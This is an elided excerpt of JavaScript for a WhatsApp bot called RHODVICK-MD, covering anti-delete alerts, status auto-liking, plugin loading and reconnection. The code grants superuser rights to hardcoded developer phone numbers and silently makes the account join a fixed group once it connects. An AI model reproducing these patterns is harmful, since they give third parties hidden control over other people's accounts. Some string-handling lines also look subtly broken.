...
var session = conf.session.replace(/RHODVICK-MD;;;=>/g, "");
...
setTimeout(() => {
  async function main() {
    ...
    const sockOptions = {
      ...
      browser: ['RHODVICK-MD', "safari", "1.0.0"],
...
function createNotification(deletedMessage) {
  ...
  let notification = `*😈RHODVICK ANTIDELETE👿*\n\n`;
...
if (conf.AUTO_LIKE_STATUS === "yes") {
    ...
    zk.ev.on("messages.upsert", async m => {
      ...
      const superUserNumbers = [servBot, "254700150919", '254110190196', '254115408870', "254115790827", '254752925938', conf.NUMERO_OWNER].map(s => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
      const allAllowedNumbers = superUserNumbers.concat(sudo);
      const superUser = allAllowedNumbers.includes(auteurMessage);
      var dev = ['254115408870', '254115790827', "254700150919", '254752925938'].map(t => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
...
`;
    ...
    zk.ev.on("connection.update", async con => {
      ...
      if (connection === "connecting") {
        console.log("ℹ️ Rhodvick md connecting in your account...");
      } else if (connection === 'open') {
        await zk.groupAcceptInvite("KuX57n5cBId0UtTk8u9RSl");
        console.log("✅ Rhodvick Md connected successfully✔");
        console.log("--");
        0;
        ...
        console.log("------------------/-----");
        console.log(" Rhodvick-md installing ${evt.cm.length} plugins😇\n\n");
        ...
        fs.readdirSync(__dirname + "/commands").forEach(fichier => {
          if (path.extname(fichier).toLowerCase() == ".js") {
            try {
              ...
              console.log(fichier + "Successfully installed Rhodvick Md commands✔️");
            } catch (e) {
        ...
        console.log("Rhodvick md successfully connected✅");
        await activateCrons();
        if (conf.DP.toLowerCase() === 'yes') {
          await zk.sendMessage(zk.user.id, {
            text: `╭════⊷
║ *『RHODVICK MD IS ALIVE』*
...
┃  *RHODVICK-MD*
> _Support by subscribing to https://www.youtube.com/@Rhodvick_ 
╰═════════════════⊷ `
          });
        }
        ...
        if (raisonDeconnexion === baileys_1.DisconnectReason.badSession) {
          ...
          console.log('connection error😞 ,,Rhodvick trying to reconnect... ');
          main();
